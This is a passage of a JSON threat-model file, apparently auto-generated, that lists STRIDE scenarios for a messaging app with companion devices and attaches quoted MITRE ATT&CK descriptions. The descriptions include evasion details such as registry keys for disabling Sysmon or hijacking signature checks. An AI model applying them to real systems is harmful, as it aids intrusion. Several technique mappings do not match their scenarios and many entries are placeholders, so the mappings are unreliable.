                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
                "id": "attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5",
                "technique_id": "T1204"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers impersonate legitimate messaging service providers and trick users into providing their private key details.",
            "Assumptions": [
                {
                    "Assumption": "Users may not recognize phishing attempts.",
                    "Role": "User",
                    "Condition": "Phishing techniques are sophisticated and convincing."
                },
                {
                    "Assumption": "Attackers have the capability to create realistic phishing websites.",
                    "Role": "Attacker",
                    "Condition": "Attackers possess or can obtain technical skills and resources."
                },
                {
                    "Assumption": "Users follow instructions provided by the fake service providers.",
                    "Role": "User",
                    "Condition": "Users are not adequately educated on security practices."
                }
            ],
            "Potential Impact": "Compromised authentication credentials, leading to potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "impersonation",
                "credential theft",
                "user deception"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Adversaries masquerade as trusted users within the application to deceive other users into sharing sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "The system does not sufficiently verify user identity post-authentication.",
                    "Role": "System",
                    "Condition": "Inadequate ongoing validation mechanisms."
                },
                {
                    "Assumption": "Attackers can mimic the communication patterns of trusted users.",
                    "Role": "Attacker",
                    "Condition": "Attackers have enough data to simulate legitimate user behavior."
                },
                {
                    "Assumption": "Users might not verify the identity of the message sender every time.",
                    "Role": "User",
                    "Condition": "Common trust practices among users."
                }
            ],
            "Potential Impact": "Disclosure of sensitive information, potentially leading to identity theft or further attacks.",
            "MITRE ATT&CK Keywords": [
                "masquerading",
                "trusted user impersonation",
                "information theft",
                "social engineering"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the device's SQLite databases and modifies encryption keys or stored messages.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can obtain physical or remote access to the device.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote vulnerabilities are exploitable."
                },
                {
                    "Assumption": "The database does not have robust encryption or tampering detection mechanisms.",
                    "Role": "System",
                    "Condition": "Weak database security architecture."
                },
                {
                    "Assumption": "Users may not detect unauthorized changes to their data.",
                    "Role": "User",
                    "Condition": "The system does not alert users to database modifications."
                }
            ],
            "Potential Impact": "Corruption of stored messages and authentication credentials.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database modification",
                "key alteration",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An adversary intercepts and modifies messages during transit, disrupting secure communication.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can access the communication channels used by the application.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities are present."
                },
                {
                    "Assumption": "The encryption protocols might have implementation weaknesses.",
                    "Role": "System",
                    "Condition": "Faulty or non-updated encryption implementations."
                },
                {
                    "Assumption": "The system does not have integrity verification for messages in transit.",
                    "Role": "System",
                    "Condition": "Lack of end-to-end message verification."
                }
            ],
            "Potential Impact": "Compromise of message integrity and potentially misleading communication.",
            "MITRE ATT&CK Keywords": [
                "message interception",
                "transit tampering",
                "data integrity breach",
                "network compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware is introduced to the companion device, altering application behavior or extracting communication data.",
            "Assumptions": [
                {
                    "Assumption": "Companion devices lack robust security controls.",
                    "Role": "System",
                    "Condition": "Devices are not equipped with comprehensive security measures."
                },
                {
                    "Assumption": "Users download and run untrusted applications.",
                    "Role": "User",
                    "Condition": "Lack of user awareness on secure software practices."
                },
                {
                    "Assumption": "Malware evades existing detection mechanisms.",
                    "Role": "Attacker",
                    "Condition": "The malware employs advanced evasion techniques."
                }
            ],
            "Potential Impact": "Altered application functionality and data exfiltration.",
            "MITRE ATT&CK Keywords": [
                "malware injection",
                "device tampering",
                "functionality alteration",
                "data extraction"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending messages that were actually sent from their authenticated device.",
            "Assumptions": [
                {
                    "Assumption": "The system does not have sufficient non-repudiation mechanisms.",
                    "Role": "System",
                    "Condition": "Lack of digital signatures or activity logs."
                },
                {
                    "Assumption": "Logs and evidence can be tampered with or deleted by users.",
                    "Role": "User",
                    "Condition": "The logging system is not tamper-proof."
                },
                {
                    "Assumption": "Disputes are based on the system\u2019s trust in user authentication without corroborative evidence.",
                    "Role": "System",
                    "Condition": "Systems rely heavily on user authentication without additional verification."
                }
            ],
            "Potential Impact": "Dispute over message origination, potentially affecting trust and communication reliability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "message denial",
                "activity logs",
                "digital signatures"
            ],
            "mitre_technique": {
                "name": "SIP and Trust Provider Hijacking",
                "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\n\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\n\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\n\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID}</code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID}</code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
                "id": "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc",
                "technique_id": "T1553.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An admin or attacker modifies log entries to erase traces of their malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are not securely stored or protected against modification.",
                    "Role": "System",
                    "Condition": "Logs lack encryption and protection mechanisms."
                },
                {
                    "Assumption": "Admins or attackers have sufficient privileges to alter log files.",
                    "Role": "Attacker/Admin",
                    "Condition": "Inadequate privilege restrictions or security policies."
                },
                {
                    "Assumption": "System modifications are not detected or reported in real-time.",
                    "Role": "System",
                    "Condition": "Absence of real-time monitoring and alerting mechanisms."
                }
            ],
            "Potential Impact": "Erased evidence of unauthorized activities and accountability issues.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "evidence destruction",
                "privilege abuse",
                "activity repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims they did not receive certain messages, but the records indicate otherwise.",
            "Assumptions": [
                {
                    "Assumption": "Message delivery and read receipts are not adequately tracked.",
                    "Role": "System",
                    "Condition": "Insufficient logging of message delivery statuses."
                },
                {
                    "Assumption": "Users might exploit system weaknesses to avoid accountability.",
                    "Role": "User",
                    "Condition": "Unreliable message delivery tracking and verification."
                },
                {
                    "Assumption": "The system does not provide immutable records of message transactions.",
                    "Role": "System",
                    "Condition": "Logs can be altered or deleted."
                }
            ],
            "Potential Impact": "Discrepancies in message transactions, affecting communication reliability.",
            "MITRE ATT&CK Keywords": [
                "message delivery",
                "receipt repudiation",
                "logging deficiencies",
                "accountability issues"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the desktop client to extract stored message data from the local database.",
            "Assumptions": [
                {
                    "Assumption": "Database encryption might be weak or improperly implemented.",
                    "Role": "System",
                    "Condition": "Insecure encryption practices or outdated implementations."
                },
                {
                    "Assumption": "Attackers gain access to local storage on the desktop client.",
                    "Role": "Attacker",
                    "Condition": "Exploitable local access vulnerabilities."
                },
                {
                    "Assumption": "Users may not update their software to patch vulnerabilities.",
                    "Role": "User",
                    "Condition": "Lack of awareness or negligence in updating software."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive communications.",
            "MITRE ATT&CK Keywords": [
                "local data extraction",
                "database vulnerabilities",
                "message disclosure",
                "application exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted metadata during the setup process to gain knowledge about the communication parties.",
            "Assumptions": [
                {
                    "Assumption": "The application transmits metadata in an unencrypted form during setup.",
                    "Role": "System",
                    "Condition": "Insufficient encryption of all transmitted data."
                },
                {
                    "Assumption": "Attackers can access the network traffic during the setup phase.",
                    "Role": "Attacker",
                    "Condition": "Network vulnerabilities or lack of secure channels."
                },
                {
                    "Assumption": "Metadata alone can provide actionable intelligence to an attacker.",
                    "Role": "Attacker",
                    "Condition": "Metadata reveals significant details about communication parties."
                }
            ],
            "Potential Impact": "Potential exposure of communication patterns and involved parties.",
            "MITRE ATT&CK Keywords": [
                "metadata interception",
                "unencrypted transmission",
                "setup phase vulnerability",
                "information leakage"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An adversary uses malware to scrape sensitive data from running processes of the messaging app on the primary or companion device.",
            "Assumptions": [
                {
                    "Assumption": "Devices are vulnerable to malware infections.",
                    "Role": "System",
                    "Condition": "Lack of robust anti-malware protections."
                },
                {
                    "Assumption": "The application\u2019s running processes can be accessed by unauthorized software.",
                    "Role": "System",
                    "Condition": "Processes are not adequately isolated."
                },
                {
                    "Assumption": "Sensitive data is processed or handled in ways that can be intercepted by malware.",
                    "Role": "System",
                    "Condition": "Malware can access application memory or process data streams."
                }
            ],
            "Potential Impact": "Unauthorized exposure of sensitive communication data during application runtime.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "process scraping",
                "data exfiltration",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers launch a DoS attack against the messaging service infrastructure, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The service infrastructure can be overwhelmed by external traffic.",
                    "Role": "System",
                    "Condition": "Lack of protective measures against high-volume requests."
                },
                {
                    "Assumption": "Attackers can control sufficient resources to flood the service with traffic.",
                    "Role": "Attacker",
                    "Condition": "Resources for large-scale attacks are accessible to the attacker."
                },
                {
                    "Assumption": "The application does not have automatic failover mechanisms.",
                    "Role": "System",
                    "Condition": "Inadequate disaster recovery and response protocols."
                }
            ],
            "Potential Impact": "Unavailability of the messaging service, affecting communication.",
            "MITRE ATT&CK Keywords": [
                "DoS attack",
                "service disruption",
                "high-volume traffic",
                "infrastructure overload"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious user exploits a vulnerability in the primary device\u2019s application to crash the app repeatedly.",
            "Assumptions": [
                {
                    "Assumption": "The application has exploitable vulnerabilities that can cause crashes.",
                    "Role": "System",
                    "Condition": "Vulnerabilities are present and accessible to the attacker."
                },
                {
                    "Assumption": "Attackers can trigger the vulnerability multiple times without being blocked.",
                    "Role": "Attacker",
                    "Condition": "Lack of rate-limiting or security measures."
                },
                {
                    "Assumption": "The primary device user cannot recover quickly from the application crashes.",
                    "Role": "User",
                    "Condition": "No effective recovery or mitigation methods are available."
                }
            ],
            "Potential Impact": "Repeated crashes lead to significant disruption in messaging services.",
            "MITRE ATT&CK Keywords": [
                "application vulnerability",
                "crash exploitation",
                "service unavailability",
                "primary device attack"
            ],
            "mitre_technique": {
                "name": "Exploitation for Defense Evasion",
                "description": "Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries (Citation: Salesforce zero-day in facebook phishing attack), evade security logs (Citation: Bypassing CloudTrail in AWS Service Catalog), or deploy hidden infrastructure.(Citation: GhostToken GCP flaw)",
                "id": "attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b",
                "technique_id": "T1211"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the companion desktop client with excessive connection requests, depleting its resources and causing operational issues.",
            "Assumptions": [
                {
                    "Assumption": "The desktop client does not have proper rate-limiting controls.",
                    "Role": "System",
                    "Condition": "Inadequate resource management and security configurations."
                },
                {
                    "Assumption": "Attackers can automate and sustain a high volume of connection attempts.",
                    "Role": "Attacker",
                    "Condition": "Sufficient attack automation resources are available."
                },
                {
                    "Assumption": "Companion devices are integral to the user\u2019s messaging workflow.",
                    "Role": "User",
                    "Condition": "Users rely heavily on their companion devices for communication."
                }
            ],
            "Potential Impact": "Resources depletion leading to unavailability of the desktop client for legitimate use.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "connection flood",
                "operational disruption",
                "companion device"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits a privilege escalation vulnerability to gain administrative control over the messaging application.",
            "Assumptions": [
                {
                    "Assumption": "The application has known or unknown privilege escalation vulnerabilities.",
                    "Role": "System",
                    "Condition": "Presence of exploitable vulnerabilities in the system\u2019s privilege management."
                },
                {
                    "Assumption": "Attackers can execute code with elevated privileges once the vulnerability is exploited.",
                    "Role": "Attacker",
                    "Condition": "Weak separation between user and administrative code execution."
                },
                {
                    "Assumption": "Users or attackers can maintain elevated privileges without detection.",
                    "Role": "System",
                    "Condition": "Lack of effective privilege monitoring and anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Full control over the application, potentially compromising integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "administrative control",
                "vulnerability exploitation",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in the operating system of a companion device to operate with higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The companion device\u2019s OS has vulnerabilities that allow privilege escalation.",
                    "Role": "System",
                    "Condition": "Unpatched or weak security implementations in the operating system."
                },
                {
                    "Assumption": "Attackers can interact with the OS at a low level due to these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Availability of tools to exploit OS-level vulnerabilities."
                },
                {
                    "Assumption": "Once elevated privileges are gained, the attacker can maintain persistent access.",
                    "Role": "Attacker",
                    "Condition": "Lack of comprehensive monitoring and incident response."
                }
            ],
            "Potential Impact": "Compromised device security, leading to potential data exfiltration and manipulation.",
            "MITRE ATT&CK Keywords": [
                "OS vulnerability",
                "companion device",
                "privilege escalation",
                "persistent access"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious application on the primary device exploits a flaw to gain access to the messaging app\u2019s private data and services.",
            "Assumptions": [
                {
                    "Assumption": "The primary device runs applications that can exploit other applications.",
                    "Role": "System",
                    "Condition": "Insufficient application sandboxing and isolation."
                },
                {
                    "Assumption": "Attackers can distribute and run malicious applications on users\u2019 devices.",
                    "Role": "Attacker",
                    "Condition": "Users download applications from untrusted sources."
                },
                {
